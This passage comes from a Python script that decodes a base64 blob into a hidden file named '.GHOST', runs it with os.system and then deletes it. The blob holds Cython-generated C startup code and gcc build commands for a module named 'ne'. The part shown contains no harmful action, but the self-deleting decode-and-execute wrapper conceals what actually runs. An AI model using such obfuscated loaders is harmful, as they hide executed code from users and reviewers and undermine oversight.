ICBmb3IgKDsgd3JpdGU8ZW5kOyArK3dyaXRlKSB7CiAgICAgICAgd3JpdGUtPmlkID0gMDsKICAgICAgICB3cml0ZS0+bW9kdWxlID0gTlVMTDsKICAgIH0KICAgIGRhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4ID0gMDsKfQpzdGF0aWMgaW50IF9fUHl4X1N0YXRlX0FkZE1vZHVsZShQeU9iamVjdCogbW9kdWxlLCBDWVRIT05fVU5VU0VEIHZvaWQqIGR1bW15KSB7CiAgICBpbnQ2NF90IGludGVycHJldGVyX2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7CiAgICBpZiAoaW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHJldHVybiAtMTsKICAgIGludCByZXN1bHQgPSAwOwogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpOwojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqb2xkX2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopCiAgICAgICAgICAgIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhLCAwKTsKI2Vsc2UKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqb2xkX2RhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhOwojZW5kaWYKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqbmV3X2RhdGEgPSBvbGRfZGF0YTsKICAgIGlmICghbmV3X2RhdGEpIHsKICAgICAgICBuZXdfZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKiljYWxsb2MoMSwgc2l6ZW9mKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSkpOwogICAgICAgIGlmICghbmV3X2RhdGEpIHsKICAgICAgICAgICAgcmVzdWx0ID0gLTE7CiAgICAgICAgICAgIFB5RXJyX05vTWVtb3J5KCk7CiAgICAgICAgICAgIGdvdG8gZW5kOwogICAgICAgIH0KICAgICAgICBuZXdfZGF0YS0+YWxsb2NhdGVkID0gMTsKICAgICAgICBuZXdfZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXggPSAxOwogICAgfQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKCk7CiAgICBpZiAobmV3X2RhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7CiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgX19QWVhfTU9EVUxFX1NUQVRFX0xPT0tVUF9TTUFMTF9TSVpFKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X1N0YXRlX0FkZE1vZHVsZUludGVycElkQXNJbmRleCgmbmV3X2RhdGEsIG1vZHVsZSwgaW50ZXJwcmV0ZXJfaWQpOwogICAgICAgICAgICBnb3RvIGVuZDsKICAgICAgICB9CiAgICAgICAgX19QeXhfU3RhdGVfQ29udmVydEZyb21JbnRlcnBJZEFzSW5kZXgobmV3X2RhdGEpOwogICAgfQogICAgewogICAgICAgIFB5X3NzaXplX3QgaW5zZXJ0X2F0ID0gMDsKICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGxvd2VyX2JvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKAogICAgICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlLCBuZXdfZGF0YS0+Y291bnQsIGludGVycHJldGVyX2lkKTsKICAgICAgICAgICAgYXNzZXJ0KGxvd2VyX2JvdW5kKTsKICAgICAgICAgICAgaW5zZXJ0X2F0ID0gbG93ZXJfYm91bmQgLSBuZXdfZGF0YS0+dGFibGU7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShpbnNlcnRfYXQgPCBuZXdfZGF0YS0+Y291bnQgJiYgbG93ZXJfYm91bmQtPmlkID09IGludGVycHJldGVyX2lkKSkgewogICAgICAgICAgICAgICAgbG93ZXJfYm91bmQtPm1vZHVsZSA9IG1vZHVsZTsKICAgICAgICAgICAgICAgIGdvdG8gZW5kOyAgLy8gYWxyZWFkeSBpbiB0YWJsZSwgbm90aGluZyBtb3JlIHRvIGRvCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKG5ld19kYXRhLT5jb3VudCsxID49IG5ld19kYXRhLT5hbGxvY2F0ZWQpIHsKICAgICAgICAgICAgUHlfc3NpemVfdCB0b19hbGxvY2F0ZSA9IChuZXdfZGF0YS0+Y291bnQrMSkqMjsKICAgICAgICAgICAgbmV3X2RhdGEgPQogICAgICAgICAgICAgICAgKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopcmVhbGxvYygKICAgICAgICAgICAgICAgICAgICBuZXdfZGF0YSwKICAgICAgICAgICAgICAgICAgICBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSArCiAgICAgICAgICAgICAgICAgICAgKHRvX2FsbG9jYXRlLTEpKnNpemVvZihfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKSk7CiAgICAgICAgICAgIGlmICghbmV3X2RhdGEpIHsKICAgICAgICAgICAgICAgIHJlc3VsdCA9IC0xOwogICAgICAgICAgICAgICAgbmV3X2RhdGEgPSBvbGRfZGF0YTsKICAgICAgICAgICAgICAgIFB5RXJyX05vTWVtb3J5KCk7CiAgICAgICAgICAgICAgICBnb3RvIGVuZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBuZXdfZGF0YS0+YWxsb2NhdGVkID0gdG9fYWxsb2NhdGU7CiAgICAgICAgfQogICAgICAgICsrbmV3X2RhdGEtPmNvdW50OwogICAgICAgIGludDY0X3QgbGFzdF9pZCA9IGludGVycHJldGVyX2lkOwogICAgICAgIFB5T2JqZWN0ICpsYXN0X21vZHVsZSA9IG1vZHVsZTsKICAgICAgICBmb3IgKFB5X3NzaXplX3QgaT1pbnNlcnRfYXQ7IGk8bmV3X2RhdGEtPmNvdW50OyArK2kpIHsKICAgICAgICAgICAgaW50NjRfdCBjdXJyZW50X2lkID0gbmV3X2RhdGEtPnRhYmxlW2ldLmlkOwogICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0uaWQgPSBsYXN0X2lkOwogICAgICAgICAgICBsYXN0X2lkID0gY3VycmVudF9pZDsKICAgICAgICAgICAgUHlPYmplY3QgKmN1cnJlbnRfbW9kdWxlID0gbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZTsKICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZSA9IGxhc3RfbW9kdWxlOwogICAgICAgICAgICBsYXN0X21vZHVsZSA9IGN1cnJlbnRfbW9kdWxlOwogICAgICAgIH0KICAgIH0KICBlbmQ6CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEsIG5ld19kYXRhKTsKI2Vsc2UKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEgPSBuZXdfZGF0YTsKI2VuZGlmCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludCBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUoQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkgewogICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpOwogICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gLTE7CiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCk7CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpkYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKQogICAgICAgICAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgMCk7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhOwojZW5kaWYKICAgIGlmIChkYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCkgewogICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IGRhdGEtPmNvdW50KSB7CiAgICAgICAgICAgIGRhdGEtPnRhYmxlW2ludGVycHJldGVyX2lkXS5tb2R1bGUgPSBOVUxMOwogICAgICAgIH0KICAgICAgICBnb3RvIGRvbmU7CiAgICB9CiAgICB7CiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKCk7CiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogbG93ZXJfYm91bmQgPSBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoCiAgICAgICAgICAgIGRhdGEtPnRhYmxlLCBkYXRhLT5jb3VudCwgaW50ZXJwcmV0ZXJfaWQpOwogICAgICAgIGlmICghbG93ZXJfYm91bmQpIGdvdG8gZG9uZTsKICAgICAgICBpZiAobG93ZXJfYm91bmQtPmlkICE9IGludGVycHJldGVyX2lkKSBnb3RvIGRvbmU7CiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSAqZW5kID0gZGF0YS0+dGFibGUrZGF0YS0+Y291bnQ7CiAgICAgICAgZm9yICg7bG93ZXJfYm91bmQ8ZW5kLTE7ICsrbG93ZXJfYm91bmQpIHsKICAgICAgICAgICAgbG93ZXJfYm91bmQtPmlkID0gKGxvd2VyX2JvdW5kKzEpLT5pZDsKICAgICAgICAgICAgbG93ZXJfYm91bmQtPm1vZHVsZSA9IChsb3dlcl9ib3VuZCsxKS0+bW9kdWxlOwogICAgICAgIH0KICAgIH0KICAgIC0tZGF0YS0+Y291bnQ7CiAgICBpZiAoZGF0YS0+Y291bnQgPT0gMCkgewogICAgICAgIGZyZWUoZGF0YSk7CiAgICAgICAgZGF0YSA9IE5VTEw7CiAgICB9CiAgZG9uZToKI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCiAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgZGF0YSk7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gZGF0YTsKI2VuZGlmCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKTsKICAgIHJldHVybiAwOwp9CiNlbmRpZgoKCiNpZmRlZiBfTVNDX1ZFUgojcHJhZ21hIHdhcm5pbmcoIHBvcCApCiNlbmRpZgoKCgoKI2VuZGlmIAoKI2lmZGVmIF9fRnJlZUJTRF9fCiNpbmNsdWRlIDxkZWRlLmg+CiNlbmRpZgojaWYgUFlfTUFKT1JfVkVSU0lPTiA8IDMKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIqKiBhcmd2KSB7CiNlbGlmIGRlZmluZWQoV2luMzIpIHx8IGRlZmluZWQoTVNfV0lORE9XUykKaW50IHdtYWluKGludCBhcmdjLCB3Y2hhcl90ICoqYXJndikgewojZWxzZQpzdGF0aWMgaW50IF9fUHl4X21haW4oaW50IGFyZ2MsIHdjaGFyX3QgKiphcmd2KSB7CiNlbmRpZgojaWZkZWYgX19GcmVlQlNEX18KICAgIGZwX2V4Y2VwdF90IG07CiAgICBtID0gZnBnZXRtYXNrKCk7CiAgICBmcHNldG1hc2sobSAmIH5GUF9YX09GTCk7CiNlbmRpZgogICAgaWYgKGFyZ2MgJiYgYXJndikKICAgICAgICBQeV9TZXRQcm9ncmFtTmFtZShhcmd2WzBdKTsKICAgIFB5X0luaXRpYWxpemUoKTsKICAgIGlmIChhcmdjICYmIGFyZ3YpCiAgICAgICAgUHlTeXNfU2V0QXJndihhcmdjLCBhcmd2KTsKICAgIHsKICAgICAgUHlPYmplY3QqIG0gPSBOVUxMOwogICAgICBfX3B5eF9tb2R1bGVfaXNfbWFpbl9uZSA9IDE7CiAgICAgICNpZiBQWV9NQUpPUl9WRVJTSU9OIDwgMwogICAgICAgICAgaW5pdG5lKCk7CiAgICAgICNlbGlmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogICAgICAgICAgbSA9IFB5SW5pdF9uZSgpOwogICAgICAgICAgaWYgKCFQeU1vZHVsZV9DaGVjayhtKSkgewogICAgICAgICAgICAgIFB5TW9kdWxlRGVmICptZGVmID0gKFB5TW9kdWxlRGVmICopIG07CiAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZG5hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygiX19tYWluX18iKTsKICAgICAgICAgICAgICBtID0gTlVMTDsKICAgICAgICAgICAgICBpZiAobW9kbmFtZSkgewogICAgICAgICAgICAgICAgICBtID0gUHlNb2R1bGVfTmV3T2JqZWN0KG1vZG5hbWUpOwogICAgICAgICAgICAgICAgICBQeV9ERUNSRUYobW9kbmFtZSk7CiAgICAgICAgICAgICAgICAgIGlmIChtKSBQeU1vZHVsZV9FeGVjRGVmKG0sIG1kZWYpOwogICAgICAgICAgICAgIH0KICAgICAgICAgIH0KICAgICAgI2Vsc2UKICAgICAgICAgIG0gPSBQeUluaXRfbmUoKTsKICAgICAgI2VuZGlmCiAgICAgIGlmIChQeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgICAgICBQeUVycl9QcmludCgpOwogICAgICAgICAgI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzCiAgICAgICAgICBpZiAoUHlfRmx1c2hMaW5lKCkpIFB5RXJyX0NsZWFyKCk7CiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIHJldHVybiAxOwogICAgICB9CiAgICAgIFB5X1hERUNSRUYobSk7CiAgICB9CiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwNjAwMDAKICAgIFB5X0ZpbmFsaXplKCk7CiNlbHNlCiAgICBpZiAoUHlfRmluYWxpemVFeCgpIDwgMCkKICAgICAgICByZXR1cm4gMjsKI2VuZGlmCiAgICByZXR1cm4gMDsKfQojaWYgUFlfTUFKT1JfVkVSU0lPTiA+PSAzICYmICFkZWZpbmVkKFdpbjMyKSAmJiAhZGVmaW5lZChNU19XSU5ET1dTKQojaW5jbHVkZSA8bG9jYWxlLmg+CnN0YXRpYyB3Y2hhcl90KgpfX1B5eF9jaGFyMndjaGFyKGNoYXIqIGFyZykKewogICAgd2NoYXJfdCAqcmVzOwojaWZkZWYgSEFWRV9CUk9LRU5fTUJTVE9XQ1MKICAgIHNpemVfdCBhcmdzaXplID0gc3RybGVuKGFyZyk7CiNlbHNlCiAgICBzaXplX3QgYXJnc2l6ZSA9IG1ic3Rvd2NzKE5VTEwsIGFyZywgMCk7CiNlbmRpZgogICAgc2l6ZV90IGNvdW50OwogICAgdW5zaWduZWQgY2hhciAqaW47CiAgICB3Y2hhcl90ICpvdXQ7CiNpZmRlZiBIQVZFX01CUlRPV0MKICAgIG1ic3RhdGVfdCBtYnM7CiNlbmRpZgogICAgaWYgKGFyZ3NpemUgIT0gKHNpemVfdCktMSkgewogICAgICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKChhcmdzaXplKzEpKnNpemVvZih3Y2hhcl90KSk7CiAgICAgICAgaWYgKCFyZXMpCiAgICAgICAgICAgIGdvdG8gb29tOwogICAgICAgIGNvdW50ID0gbWJzdG93Y3MocmVzLCBhcmcsIGFyZ3NpemUrMSk7CiAgICAgICAgaWYgKGNvdW50ICE9IChzaXplX3QpLTEpIHsKICAgICAgICAgICAgd2NoYXJfdCAqdG1wOwogICAgICAgICAgICBmb3IgKHRtcCA9IHJlczsgKnRtcCAhPSAwICYmCiAgICAgICAgICAgICAgICAgICAgICgqdG1wIDwgMHhkODAwIHx8ICp0bXAgPiAweGRmZmYpOyB0bXArKykKICAgICAgICAgICAgICAgIDsKICAgICAgICAgICAgaWYgKCp0bXAgPT0gMCkKICAgICAgICAgICAgICAgIHJldHVybiByZXM7CiAgICAgICAgfQogICAgICAgIGZyZWUocmVzKTsKICAgIH0KI2lmZGVmIEhBVkVfTUJSVE9XQwogICAgYXJnc2l6ZSA9IHN0cmxlbihhcmcpICsgMTsKICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKGFyZ3NpemUqc2l6ZW9mKHdjaGFyX3QpKTsKICAgIGlmICghcmVzKSBnb3RvIG9vbTsKICAgIGluID0gKHVuc2lnbmVkIGNoYXIqKWFyZzsKICAgIG91dCA9IHJlczsKICAgIG1lbXNldCgmbWJzLCAwLCBzaXplb2YgbWJzKTsKICAgIHdoaWxlIChhcmdzaXplKSB7CiAgICAgICAgc2l6ZV90IGNvbnZlcnRlZCA9IG1icnRvd2Mob3V0LCAoY2hhciopaW4sIGFyZ3NpemUsICZtYnMpOwogICAgICAgIGlmIChjb252ZXJ0ZWQgPT0gMCkKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgaWYgKGNvbnZlcnRlZCA9PSAoc2l6ZV90KS0yKSB7CiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAidW5leHBlY3RlZCBtYnJ0b3djIHJlc3VsdCAtMiIpOwogICAgICAgICAgICBmcmVlKHJlcyk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBpZiAoY29udmVydGVkID09IChzaXplX3QpLTEpIHsKICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7CiAgICAgICAgICAgIGFyZ3NpemUtLTsKICAgICAgICAgICAgbWVtc2V0KCZtYnMsIDAsIHNpemVvZiBtYnMpOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICB9CiAgICAgICAgaWYgKCpvdXQgPj0gMHhkODAwICYmICpvdXQgPD0gMHhkZmZmKSB7CiAgICAgICAgICAgIGFyZ3NpemUgLT0gY29udmVydGVkOwogICAgICAgICAgICB3aGlsZSAoY29udmVydGVkLS0pCiAgICAgICAgICAgICAgICAqb3V0KysgPSAweGRjMDAgKyAqaW4rKzsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQogICAgICAgIGluICs9IGNvbnZlcnRlZDsKICAgICAgICBhcmdzaXplIC09IGNvbnZlcnRlZDsKICAgICAgICBvdXQrKzsKICAgIH0KI2Vsc2UKICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKChzdHJsZW4oYXJnKSsxKSpzaXplb2Yod2NoYXJfdCkpOwogICAgaWYgKCFyZXMpIGdvdG8gb29tOwogICAgaW4gPSAodW5zaWduZWQgY2hhciopYXJnOwogICAgb3V0ID0gcmVzOwogICAgd2hpbGUoKmluKQogICAgICAgIGlmKCppbiA8IDEyOCkKICAgICAgICAgICAgKm91dCsrID0gKmluKys7CiAgICAgICAgZWxzZQogICAgICAgICAgICAqb3V0KysgPSAweGRjMDAgKyAqaW4rKzsKICAgICpvdXQgPSAwOwojZW5kaWYKICAgIHJldHVybiByZXM7Cm9vbToKICAgIGZwcmludGYoc3RkZXJyLCAib3V0IG9mIG1lbW9yeSIpOwogICAgcmV0dXJuIE5VTEw7Cn0KaW50Cm1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQp7CiAgICBpZiAoIWFyZ2MpIHsKICAgICAgICByZXR1cm4gX19QeXhfbWFpbigwLCBOVUxMKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIGludCBpLCByZXM7CiAgICAgICAgd2NoYXJfdCAqKmFyZ3ZfY29weSA9ICh3Y2hhcl90ICoqKW1hbGxvYyhzaXplb2Yod2NoYXJfdCopKmFyZ2MpOwogICAgICAgIHdjaGFyX3QgKiphcmd2X2NvcHkyID0gKHdjaGFyX3QgKiopbWFsbG9jKHNpemVvZih3Y2hhcl90KikqYXJnYyk7CiAgICAgICAgY2hhciAqb2xkbG9jID0gc3RyZHVwKHNldGxvY2FsZShMQ19BTEwsIE5VTEwpKTsKICAgICAgICBpZiAoIWFyZ3ZfY29weSB8fCAhYXJndl9jb3B5MiB8fCAhb2xkbG9jKSB7CiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAib3V0IG9mIG1lbW9yeSIpOwogICAgICAgICAgICBmcmVlKGFyZ3ZfY29weSk7CiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5Mik7CiAgICAgICAgICAgIGZyZWUob2xkbG9jKTsKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIHJlcyA9IDA7CiAgICAgICAgc2V0bG9jYWxlKExDX0FMTCwgIiIpOwogICAgICAgIGZvciAoaSA9IDA7IGkgPCBhcmdjOyBpKyspIHsKICAgICAgICAgICAgYXJndl9jb3B5MltpXSA9IGFyZ3ZfY29weVtpXSA9IF9fUHl4X2NoYXIyd2NoYXIoYXJndltpXSk7CiAgICAgICAgICAgIGlmICghYXJndl9jb3B5W2ldKSByZXMgPSAxOwogICAgICAgIH0KICAgICAgICBzZXRsb2NhbGUoTENfQUxMLCBvbGRsb2MpOwogICAgICAgIGZyZWUob2xkbG9jKTsKICAgICAgICBpZiAocmVzID09IDApCiAgICAgICAgICAgIHJlcyA9IF9fUHl4X21haW4oYXJnYywgYXJndl9jb3B5KTsKICAgICAgICBmb3IgKGkgPSAwOyBpIDwgYXJnYzsgaSsrKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwNTAwMDAKICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkyW2ldKTsKI2Vsc2UKICAgICAgICAgICAgUHlNZW1fUmF3RnJlZShhcmd2X2NvcHkyW2ldKTsKI2VuZGlmCiAgICAgICAgfQogICAgICAgIGZyZWUoYXJndl9jb3B5KTsKICAgICAgICBmcmVlKGFyZ3ZfY29weTIpOwogICAgICAgIHJldHVybiByZXM7CiAgICB9Cn0KI2VuZGlmCiIiIgoKQ19GSUxFID0ie25hbWUyX2Jhc2V9LmMiClBZVEhPTl9WRVJTSU9OID0gIi4iLmpvaW4oc3lzLnZlcnNpb24uc3BsaXQoIiAiKVswXS5zcGxpdCgiLiIpWzotMV0pCkNPTVBJTEVfRklMRSA9ICgnZ2NjIC1JJyArIFBSRUZJWCArICcvaW5jbHVkZS9weXRob24nICsgUFlUSE9OX1ZFUlNJT04gKyAnIC1vICcgKyBFWEVDVVRFX0ZJTEUgKyAnICcgKyBDX0ZJTEUgKyAnIC1MJyArIFBSRUZJWCArICcvbGliIC1scHl0aG9uJyArIFBZVEhPTl9WRVJTSU9OKQp3aXRoIG9wZW4oQ19GSUxFLCd3JykgYXMgZjoKICAgIGYud3JpdGUoQ19TT1VSQ0UpCm9zLm1ha2VkaXJzKG9zLnBhdGguZGlybmFtZShFWEVDVVRFX0ZJTEUpLGV4aXN0X29rPVRydWUpCm9zLnN5c3RlbShFWFBPUlRfUFlUSE9OSE9NRSArIiYmIisgRVhQT1JUX1BZVEhPTl9FWEVDVVRBQkxFICsiJiYiICsgQ09NUElMRV9GSUxFICsiJiYiKyBSVU4pCm9zLnJlbW92ZShDX0ZJTEUp'
try:
    with open('.GHOST','wb') as D:
        D.write(base64.b64decode(GHOST))
    os.system('python3 .GHOST')
except Exception as E:
    print(E)
finally:
    if os.path.exists('.GHOST'):
        os.remove('.GHOST')
